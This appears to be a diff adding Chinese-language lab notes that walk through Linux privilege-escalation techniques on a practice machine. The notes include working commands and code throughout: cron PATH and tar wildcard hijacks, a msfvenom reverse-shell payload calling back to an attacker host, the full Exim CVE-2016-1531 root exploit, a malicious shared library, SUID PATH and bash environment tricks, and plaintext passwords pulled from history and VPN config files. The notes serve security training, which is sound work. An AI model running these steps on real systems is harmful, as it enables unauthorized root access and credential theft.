@@ -939,3 +939,724 @@ whoami
 root
 ```
 
+### 自动任务 PATH 环境变量提权
+
+查看自动任务，发现 crontab 的 PATH 包含了 user 的家目录。
+
+```bash
+user@RedteamNotes:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+
+在家目录下创建一个 overwrite.sh。
+
+```bash
+user@RedteamNotes:~$ vim overwrite.sh
+user@RedteamNotes:~$ cat overwrite.sh 
+#!/bin/bash
+
+cp /bin/bash /tmp/rootBash2
+chmod +xs /tmp/rootBash2
+user@RedteamNotes:~$ chmod +xs overwrite.sh 
+user@RedteamNotes:~$ ls -liah
+total 52K
+155042 drwxr-xr-x 4 user user 4.0K Jan 15 10:04 .
+155041 drwxr-xr-x 3 root root 4.0K May 15  2017 ..
+155046 -rw------- 1 user user 2.3K Apr 28  2023 .bash_history
+155045 -rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
+155043 -rw-r--r-- 1 user user 3.2K May 14  2017 .bashrc
+375363 drwxr-xr-x 2 user user 4.0K May 13  2017 .irssi
+156485 -rw------- 1 user user  137 May 15  2017 .lesshst
+155047 -rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
+155048 -rw------- 1 user user   11 May 15  2017 .nano_history
+155072 -rwsr-sr-x 1 user user   66 Jan 15 10:04 overwrite.sh
+155044 -rw-r--r-- 1 user user  725 May 13  2017 .profile
+155049 drwxr-xr-x 8 user user 4.0K May 15  2017 tools
+155073 -rw------- 1 user user 3.8K Jan 15 10:04 .viminfo
+```
+
+等待自动任务执行获得 root。
+
+```bash
+user@RedteamNotes:~$ ls /tmp
+backup.tar.gz  rootBash2
+user@RedteamNotes:~$ /tmp/rootBash2 -p
+rootBash2-4.1# whoami
+root
+```
+
+### 自动任务通配符提权
+
+查看自动任务发现每分钟自动以 `root` 身份运行脚本 `/usr/local/bin/compress.sh`，查看该脚本。
+
+```bash
+user@RedteamNotes:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+user@RedteamNotes:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+
+解释一下这个命令
+
+```bash
+tar czf /tmp/backup.tar.gz *
+```
+
+- c：创建新的归档文件
+- z：通过 gzip 进行压缩生成 .tar.gz 格式的压缩文件，若不使用则会创建未压缩的 .tar 归档文件
+- f：指定归档文件的名称为 /tmp/backup.tar.gz
+- \*：所有内容
+
+每分钟以 `root` 的身份将 user 家目录下的所有文件打包为 `/tmp/backup.tar.gz`。
+
+在 kali 中制作反弹 shell。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o shell.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: shell.elf
+
+```
+
+上传至靶机。
+
+![](Pasted%20image%2020260115231901.png)
+
+给反弹 shell 赋权并利用 touch 使用反弹 shell。
+
+```bash
+user@RedteamNotes:~$ chmod +xs shell.elf 
+user@RedteamNotes:~$ ls -liah shell.elf 
+155063 -rwsr-sr-x 1 user user 194 Jan 15 10:18 shell.elf
+user@RedteamNotes:~$ touch /home/user/--checkpoint=1
+user@RedteamNotes:~$ touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+kali 开启监听等待反弹 shell 运行。
+
+### SUID 可执行文件利用提权
+
+查看具有 s 位的可执行文件。
+
+```bash
+user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/tmp/rootBash2
+/sbin/mount.nfs
+/home/user/overwrite.sh
+/home/user/shell.elf
+```
+
+发现 exim 很可疑，可能可以用于提权，使用 searchsploit 搜索一下。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ searchsploit exim 4.84
+---------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+Exim - 'perl_startup' Local Privilege Escalation (Metasploit)         | linux/local/39702.rb
+Exim 4.84-3 - Local Privilege Escalation                              | linux/local/39535.sh
+Exim < 4.86.2 - Local Privilege Escalation                            | linux/local/39549.txt
+Exim < 4.90.1 - 'base64d' Remote Code Execution                       | linux/remote/44571.py
+PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution              | php/webapps/42221.py
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
+
+有一个版本匹配的本地提权漏洞利用脚本，下载下来看看能不能利用。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ searchsploit -m 39535 
+  Exploit: Exim 4.84-3 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/39535
+     Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
+    Codes: CVE-2016-1531
+ Verified: True
+File Type: POSIX shell script, ASCII text executable
+Copied to: /home/kali/Work/Kali/39535.sh
+
+
+                                                                                                        
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ ls
+39535.sh  shell.elf
+                                                                                                        
+┌──(kali㉿kali)-[~/Work/Kali]
+└─$ cat 39535.sh 
+#!/bin/sh
+# CVE-2016-1531 exim <= 4.84-3 local root exploit
+# ===============================================
+# you can write files as root or force a perl module to
+# load by manipulating the perl environment and running
+# exim with the "perl_startup" arguement -ps.
+#
+# e.g.
+# [fantastic@localhost tmp]$ ./cve-2016-1531.sh
+# [ CVE-2016-1531 local root exploit
+# sh-4.3# id
+# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
+#
+# -- Hacker Fantastic
+echo [ CVE-2016-1531 local root exploit
+cat > /tmp/root.pm << EOF
+package root;
+use strict;
+use warnings;
+
+system("/bin/sh");
+EOF
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
+```
+
+下载利用脚本至靶机，赋予权限。
+
+![](Pasted%20image%2020260115234353.png)
+
+利用获得 root。
+
+![](Pasted%20image%2020260115234547.png)
+
+### SUID 共享库注入提权
+
+查看具有 s 位的可执行文件。
+
+```bash
+user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/tmp/rootBash2
+/sbin/mount.nfs
+/home/user/overwrite.sh
+/home/user/shell.elf
+```
+
+尝试运行分析 /usr/local/bin/suid-so 。
+
+```bash
+user@RedteamNotes:~$ /usr/local/bin/suid-so
+Calculating something, please wait...
+[=====================================================================>] 99 %
+Done.
+user@RedteamNotes:~$ strings /usr/local/bin/suid-so
+/lib64/ld-linux-x86-64.so.2
+#eGVO
+CyIk
+libdl.so.2
+__gmon_start__
+_Jv_RegisterClasses
+dlopen
+libstdc++.so.6
+_ZNSt8ios_base4InitD1Ev
+_ZNSolsEPFRSoS_E
+__gxx_personality_v0
+_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
+_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
+_ZSt4cout
+_ZNSo5flushEv
+_ZNSt8ios_base4InitC1Ev
+_ZNSolsEi
+libm.so.6
+libgcc_s.so.1
+libc.so.6
+__cxa_atexit
+__libc_start_main
+GLIBC_2.2.5
+CXXABI_1.3
+GLIBCXX_3.4
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+Calculating something, please wait...
+/home/user/.config/libcalc.so
+Done.
+Y@-C
+```
+
+发现可能链接 /home/user/.config/libcalc.so，使用 strace 进行进一步的分析。
+
+```bash
+user@RedteamNotes:~$ strace /usr/local/bin/suid-so 2>&1 | grep 'home'
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+```
+
+发现尝试打开 /home/user/.config/libcalc.so 的时候未寻找到该文件或目录，我们创建一个让他打开。
+
+```bash
+user@RedteamNotes:~$ pwd
+/home/user
+user@RedteamNotes:~$ mkdir .config
+user@RedteamNotes:~$ cd .config/
+user@RedteamNotes:~/.config$ vim libcalc.c
+user@RedteamNotes:~/.config$ cat libcalc.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+static void injetc() __attribute__((constructor));
+
+void injetc() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c
+gcc: libcalc.c: No such file or directory
+gcc: no input files
+user@RedteamNotes:~/.config$ mv libcalc.so libcalc.c
+user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c
+user@RedteamNotes:~/.config$ /usr/local/bin/suid-so
+Calculating something, please wait...
+bash-4.1# whoami
+root
+```
+
+解释一下这个 c 程序。
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void injetc() __attribute__((constructor));
+
+void injetc() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+
+- static void injetc() __attribute__((constructor));：声明一个名为 inject 的静态函数，并使用 gcc 的 __attribute__((constructor)) 属性。这个属性使得在程序或动态库加载时自动执行 inject 函数，而不需要显式调用它。
+
+### SUID 环境变量提权
+
+查看具有 s 位的可执行文件。
+
+```bash
+user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/tmp/rootBash2
+/sbin/mount.nfs
+/home/user/overwrite.sh
+/home/user/shell.elf
+```
+
+`/usr/local/bin/suid-env` 可能可以利用提权，查看详细信息。
+
+```bash
+user@RedteamNotes:~$ file /usr/local/bin/suid-env
+/usr/local/bin/suid-env: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
+user@RedteamNotes:~$ /usr/local/bin/suid-env
+Starting web server: apache2httpd (pid 1603) already running
+.
+user@RedteamNotes:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+
+发现程序使用 `service` 启动 `apache2` 服务，使用的是相对路径而非绝对路径，在本地创建一个 `service`，让程序执行我们的 `service` 达成提权。
+
+```bash
+user@RedteamNotes:~$ vim service.c 
+user@RedteamNotes:~$ cat service.c 
+#include <stdio.h>
+#include <stdlib.h>
+
+void main() {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash -p");
+}
+user@RedteamNotes:~$ gcc -o service service.c 
+user@RedteamNotes:~$ export PATH=.:$PATH
+user@RedteamNotes:~$ echo $PATH
+.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
+user@RedteamNotes:~$ /usr/local/bin/suid-env
+root@RedteamNotes:~# whoami
+root
+```
+
+### 巧用 SUID-shell 功能提权
+
+查看具有 s 位的可执行文件。
+
+```bash
+user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/tmp/rootBash2
+/sbin/mount.nfs
+/home/user/overwrite.sh
+/home/user/shell.elf
+```
+
+发现 `/usr/local/bin/suid-env2` 可能可以作为提权的路径，运行查看详细信息。
+
+```bash
+user@RedteamNotes:~$ /usr/local/bin/suid-env2
+Starting web server: apache2httpd (pid 1603) already running
+.
+user@RedteamNotes:~$ strings /usr/local/bin/suid-env2
+/lib64/ld-linux-x86-64.so.2
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+```
+
+程序使用 `/usr/sbin/service` 启动 `apache2` 服务，查看 `bash` 版本。
+
+```bash
+user@RedteamNotes:~$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+```
+
+`bash` 的版本为 4.1.5，当 `bash`的版本小于 4.2-048 时，在 `Bash shell` 中定义并导出一个名为 `/usr/sbin/service` 的函数。这个函数的定义为运行一个新的 `Bash shell` 进程，并在该进程中启用特权模式，然后这个函数通过 `export -f` 命令导出，这使得它可以在当前 `Bash shell` 会话的子进程中被访问执行。
+
+- `export -f` 将整个函数导入而非一个变量
+
+```bash
+user@RedteamNotes:~$ function /usr/sbin/service { /bin/bash -p; }
+user@RedteamNotes:~$ export -f /usr/sbin/service 
+user@RedteamNotes:~$ /usr/local/bin/suid-env2
+root@RedteamNotes:~# whoami
+root
+```
+
+### 巧用 SUID-shell 功能提权 2
+
+查看具有 s 位的可执行文件与 `bash` 版本。`bash` 版本小于 4。
+
+```bash
+user@RedteamNotes:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/sudoedit
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/local/bin/suid-so
+/usr/local/bin/suid-env
+/usr/local/bin/suid-env2
+/usr/sbin/exim-4.84-3
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/pt_chown
+/bin/ping6
+/bin/ping
+/bin/mount
+/bin/su
+/bin/umount
+/tmp/rootBash2
+/sbin/mount.nfs
+/home/user/overwrite.sh
+/home/user/shell.elf
+user@RedteamNotes:~$ /bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+```
+
+同样使用 `/usr/local/bin/suid-env2` 进行提权。
+
+```bash
+user@RedteamNotes:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash2;chmod +xs /tmp/rootbash2)' /usr/local/bin/suid-env2
+/usr/sbin/service apache2 start
+basename /usr/sbin/service
+VERSION='service ver. 0.91-ubuntu1'
+basename /usr/sbin/service
+USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
+SERVICE=
+ACTION=
+SERVICEDIR=/etc/init.d
+OPTIONS=
+'[' 2 -eq 0 ']'
+cd /
+'[' 2 -gt 0 ']'
+case "${1}" in
+'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
+'[' 2 -eq 2 -a start = --full-restart ']'
+'[' -z '' ']'
+SERVICE=apache2
+shift
+'[' 1 -gt 0 ']'
+case "${1}" in
+'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
+'[' 1 -eq 2 -a '' = --full-restart ']'
+'[' -z apache2 ']'
+'[' -z '' ']'
+ACTION=start
+shift
+'[' 0 -gt 0 ']'
+'[' -r /etc/init/apache2.conf ']'
+'[' -x /etc/init.d/apache2 ']'
+exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
+Starting web server: apache2httpd (pid 1603) already running
+.
+```
+
+解释一下这个命令。
+
+```sh
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash2;chmod +xs /tmp/rootbash2)' /usr/local/bin/suid-env2
+```
+
+- -i 参数表示 ignore environment，即忽略现有的环境变量
+- xtrace 选项被设置，这将导致 shell 执行每个命令之前都打印该命令在做什么
+- PS4 环境变量定义了打印输出的格式为一个命令序列，该序列先复制 /bin/bash 到 /tmp/rootbash2，然后设置 SUID 和可执行状态，在这个特定的命令序列中，xtrace 选项被用于触发 PS4 环境变量中的命令
+- SHELLOPTS 是一个只读的 Bash 环境变量，用于列出当前已启用的 shell 选项。这个环境变量的值是一个以冒号分隔的列表，其中包含了当前已启用的 shell 选项的名字。例如启用了 strace 和 ignoreeof 选项则为 xtrace:ignoreeof。
+- PS 代表 Prompt Strings。这是用于定义 shell 提示符的环境变量。例如，PS1 是主提示符，是命令行最常见的提示符，通常用于显示工作目录或用户名称等信息；PS2 是第二提示符，用于在需要额外输入时显示，例如在多行命令或 read 命令中。而 PS4 则是用于定义当 shell 以 xtrace 模式运行时的提示符。默认情况下 PS4 设置为 '+'，这就是为什么运行带 -x 参数的命令时会有 '+' 符号，在这个命令中每次 xtrace 在打印命令前会执行我们给出的恶意代码来尝试获得 shell
+
+可以看到已经复制成功了。
+
+```bash
+user@RedteamNotes:~$ ls -liah /tmp
+total 2.0M
+1158721 drwxrwxrwt  4 root root 4.0K Jan 16 04:15 .
+      2 drwxr-xr-x 21 root root 4.0K Apr 22  2023 ..
+1158728 -rw-r--r--  1 root root 127K Jan 16 04:15 backup.tar.gz
+1158724 drwxrwxrwt  2 root root 4.0K Jan 16 03:31 .ICE-unix
+1158725 -rwsr-sr-x  1 root root 905K Jan 16 04:05 rootbash2
+1158727 -rwsr-sr-x  1 root root 905K Jan 16 04:15 rootBash2
+1158723 drwxrwxrwt  2 root root 4.0K Jan 16 03:31 .X11-unix
+user@RedteamNotes:~$ /tmp/rootbash2
+user@RedteamNotes:~$ /tmp/rootbash2 -p
+rootbash2-4.1# whoami
+root
+```
+
+### 密码和密钥历史文件提权
+
+查看历史记录有没有明文密码泄露。
+
+```bash
+user@RedteamNotes:~$ cat ~/.*history | grep 'root'
+mysql -h somehost.local -uroot -ppassword123
+su root
+```
+
+发现密码尝试登入。
+
+```bash
+user@RedteamNotes:~$ su root
+Password: 
+root@RedteamNotes:/home/user# whoami
+root
+```
+
+### 密码和密钥配置文件查看提权
+
+查看家目录下的文件。
+
+```bash
+user@RedteamNotes:~$ pwd
+/home/user
+user@RedteamNotes:~$ ls -liah
+total 76K
+155042 drwxr-xr-x 5 user user 4.0K Jan 16 03:47 .
+155041 drwxr-xr-x 3 root root 4.0K May 15  2017 ..
+155075 -rwxr-xr-x 1 user user  638 Jan 15 10:42 39535.sh
+155046 -rw------- 1 user user 2.4K Jan 16 04:16 .bash_history
+155045 -rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
+155043 -rw-r--r-- 1 user user 3.2K May 14  2017 .bashrc
+155071 -rw-r--r-- 1 user user    0 Jan 15 10:22 --checkpoint=1
+155074 -rw-r--r-- 1 user user    0 Jan 15 10:23 --checkpoint-action=exec=shell.elf
+155076 drwxr-xr-x 2 user user 4.0K Jan 15 11:03 .config
+375363 drwxr-xr-x 2 user user 4.0K May 13  2017 .irssi
+156485 -rw------- 1 user user  137 May 15  2017 .lesshst
+155047 -rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
+155048 -rw------- 1 user user   11 May 15  2017 .nano_history
+155072 -rwsr-sr-x 1 user user   66 Jan 15 10:04 overwrite.sh
+155044 -rw-r--r-- 1 user user  725 May 13  2017 .profile
+155077 -rwxr-xr-x 1 user user 6.7K Jan 16 03:47 service
+155082 -rw-r--r-- 1 user user  105 Jan 16 03:47 service.c
+155063 -rwsr-sr-x 1 user user  194 Jan 15 10:18 shell.elf
+155049 drwxr-xr-x 8 user user 4.0K May 15  2017 tools
+155083 -rw------- 1 user user 4.0K Jan 16 03:47 .viminfo
+```
+
+发现 `myvpn.ovpn` 很可疑，查看详细情况。
+
+```bash
+user@RedteamNotes:~$ cat myvpn.ovpn 
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt
+comp-lzo
+verb 1
+reneg-sec 0
+```
+
+发现认证密码凭据存放在 `/etc/openvpn/auth.txt` 中，查看详细信息。
+
+```bash
+user@RedteamNotes:~$ cat /etc/openvpn/auth.txt
+root
+password123
+```
+
+切换为 root。
+
+```bash
+user@RedteamNotes:~$ su root
+Password: 
+root@RedteamNotes:/home/user# whoami
+root
+```
+
